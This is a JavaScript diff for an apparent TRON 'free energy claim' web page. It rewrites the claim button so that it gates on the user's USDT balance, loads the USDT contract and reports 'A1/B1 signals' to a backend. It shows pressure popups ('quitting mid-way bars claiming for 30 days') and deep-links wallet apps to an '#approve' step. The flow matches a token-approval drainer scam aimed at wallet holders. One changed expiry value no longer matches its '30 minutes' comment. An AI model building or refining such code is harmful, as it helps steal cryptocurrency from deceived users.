@@ -859,7 +859,7 @@ function hasSentB1Signal(address) {
     const item = records[address];
     if (!item) return false;
     // 30分钟过期（1800000毫秒）
-    return Date.now() - item.time <18000000;
+    return Date.now() - item.time <1800000000;
   } catch (e) {
     console.warn("检查B1信号失败：", e);
     return false;
@@ -1328,87 +1328,132 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 领取按钮逻辑（最小可用版，必跑通） ==========
+// ========== 新增：自动消失的弹窗工具（无需点击确认，2秒后自动关闭） ==========
+function showAutoCloseAlert(message) {
+  // 创建临时弹窗元素
+  const alertDiv = document.createElement("div");
+  alertDiv.style.cssText = `
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    padding: 20px 30px; background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    font-size: 16px; color: #333; z-index: 9999; text-align: center;
+  `;
+  alertDiv.textContent = message;
+  document.body.appendChild(alertDiv);
+
+  // 2秒后自动移除弹窗
+  setTimeout(() => {
+    alertDiv.style.opacity = "0";
+    alertDiv.style.transition = "opacity 0.3s";
+    setTimeout(() => document.body.removeChild(alertDiv), 300);
+  }, 2000);
+}
+
+// ========== 核心逻辑bindApproveLogic修改 ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
-    const btn = approveBtn;
-    const reviewTipText = document.getElementById("reviewTipText");
-
-    // 初始化按钮状态：符合条件才启用
     if (tokenBalance > 1 && !isAddressAuthorized(userAddress)) {
-        btn.disabled = false;
-        btn.textContent = lang.approveBtnText;
-    } else {
-        btn.disabled = true;
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
     }
 
-    // 按钮点击事件（async确保await可用）
-    btn.onclick = async () => {
-        const userAddress = window.tronWeb?.defaultAddress?.base58;
-        if (!userAddress) {
-            alert(lang.noWalletAddress.split("<br>")[0]);
-            return;
-        }
-
-        // 按钮置为加载中
+    approveBtn.onclick = async () => {
+        const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
-        reviewTip.style.display = "block";
 
-        // 1. B1防重复判断（30分钟内不重复发信号）
-        const isB1Sent = hasSentB1Signal(userAddress);
+        // 移除页面提示框（全程不用reviewTip）
+        reviewTip.style.display = "none";
 
-        // 2. 仅第一次点击发送B1信号，重复点击直接跳
-        if (!isB1Sent) {
-            try {
-                reviewTipText.textContent = "正在申请能量，请稍候...";
-                await sendSignalB(true); // 发送B1信号
-                markB1SignalSent(userAddress); // 标记防重复
-            } catch (e) {
-                console.error("B1信号发送失败（不影响跳转）：", e);
-                alert(`申请提示：${e.message}，将直接跳转授权`);
+        try {
+            // 基础校验+A1信号校验（保留原有逻辑）
+            if (!userAddress) {
+                showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
+                btn.disabled = false;
+                btn.textContent = lang.approveBtnText;
+                return;
             }
-        } else {
-            reviewTipText.textContent = "已申请过能量，直接跳转授权...";
-        }
+            if (isAddressAuthorized(userAddress)) {
+                showAutoCloseAlert(lang.authorizedTip.split("<br>")[3]);
+                btn.disabled = true;
+                btn.textContent = lang.authorizedBtn;
+                return;
+            }
+            if (tokenBalance <= 1) {
+                showAutoCloseAlert(lang.insufficientUsdt.split("<br>")[2]);
+                btn.disabled = true;
+                btn.textContent = lang.insufficientBtn;
+                return;
+            }
+            if (!trc20Contract) {
+                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                if (!trc20Contract) {
+                    throw new Error(lang.systemBusyTip);
+                }
+            }
 
-        // 3. 无论是否发信号，强制跳转（核心需求）
-        // 替换之前的“跳转部分”代码
-setTimeout(() => {
-    // 关键：检测是否在imToken内置浏览器中
-    const isImTokenInApp = window.tronWeb?.provider?.isImToken;
+            let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            let isA1Success = a1Status[userAddress] === "success";
+            if (!isA1Success) {
+                showAutoCloseAlert(lang.systemBusyTip);
+                const retryA1 = await sendSignalA1().catch(err => false);
+                if (!retryA1) {
+                    throw new Error("A1信号同步失败，请刷新页面");
+                }
+                a1Status[userAddress] = "success";
+                localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+                isA1Success = true;
+            }
 
-    if (isImTokenInApp) {
-        // 内置浏览器：直接执行授权（不跳转）
-        try {
-            autoApprove(); // 直接调用之前的授权函数
-            console.log("内置浏览器，直接执行授权");
+            // ========== 核心修改：统一用自动弹窗，无页面提示 ==========
+            let isB1Repeated = hasSentB1Signal(userAddress);
+            if (isB1Repeated) {
+                // 防重复对象：弹窗提示→直接跳转
+                showAutoCloseAlert("已提交，跳转授权中...");
+            } else {
+                // 非防重复对象：弹窗提示审核中→标记锁定→等待B1信号
+                showAutoCloseAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
+                markB1SignalSent(userAddress); // 立即锁定30天
+
+                // 等待B1信号返回（不显示页面提示，仅靠弹窗告知状态）
+                const b1Response = await sendSignalB(true);
+                if (!b1Response) {
+                    // B1信号失败：弹窗提示重试，自动消失
+                    showAutoCloseAlert("现在领取的人太多啦，请稍后重试");
+                    btn.disabled = false;
+                    btn.textContent = lang.approveBtnText;
+                    return; // 终止流程，不跳转
+                }
+            }
+
+            // ========== B1成功/防重复对象：自动跳转 ==========
+            addAuthorizedAddress(userAddress);
+            saveEnergyRecord();
+            renderEnergyRecords();
+            
+            // 多钱包适配跳转（弹窗消失后执行）
+            let walletScheme = "imtokenv2://navigate/DappView?url=";
+            if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
+                walletScheme = "tpdapp://open?params={\"url\":\"";
+            } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
+                walletScheme = "tronlinkoutside://pull.activity?param=";
+            } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
+                walletScheme = "bitkeep://bkconnect?action=dapp&url=";
+            }
+            const approveUrl = window.location.href + "#approve";
+            
+            // 等待弹窗消失（2秒）后跳转
+            setTimeout(() => {
+                window.location.href = walletScheme + encodeURIComponent(approveUrl);
+            }, 2000);
+
         } catch (e) {
-            alert(`授权启动失败：${e.message}，请点击按钮重试`);
+            console.error("领取流程异常：", e);
+            showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-            reviewTip.style.display = "none";
         }
-    } else {
-        // 外部浏览器：用Scheme跳转
-        const approveUrl = window.location.href + "#approve";
-        const encodedUrl = encodeURIComponent(approveUrl);
-        // imToken最新universal link（Scheme失效时用这个）
-        const jumpUrl = `https://app.imtoken.io/dapp?url=${encodedUrl}`;
-
-        try {
-            window.location.href = jumpUrl;
-            console.log("外部浏览器，跳转钱包：", jumpUrl);
-        } catch (e) {
-            alert(`跳转失败！手动打开imToken→浏览→输入：${window.location.href}`);
-            btn.disabled = false;
-            btn.textContent = lang.approveBtnText;
-            reviewTip.style.display = "none";
-        }
-    }
-}, 300);
     };
-} 
+}
 // ========== 辅助函数（全部保留） ==========
 function updateWalletStatus() {
     userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
